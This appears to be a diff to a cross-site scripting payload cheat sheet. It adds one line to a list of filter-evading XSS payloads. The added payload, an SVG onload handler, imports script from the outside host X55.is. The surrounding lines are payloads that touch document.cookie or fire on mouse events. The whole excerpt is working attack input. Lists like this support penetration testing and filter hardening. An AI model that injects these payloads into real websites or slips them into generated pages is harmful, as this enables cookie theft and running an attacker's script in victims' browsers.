@@ -221,6 +221,7 @@ XSS attacks may be conducted without using `<script>...</script>` html tags. Oth
   "><D3V%0aONPoiNtERENTEr%0d=%0d[document.cookie].find(confirm)%0dx>
   " onmouseenter=confirm(1)//
   '%20onmouseenter=confirm(1)//
+  <Svg+OnLoad=import(%27//X55.is%27)>#alert(document.domain)//
   ```
 </details>
 
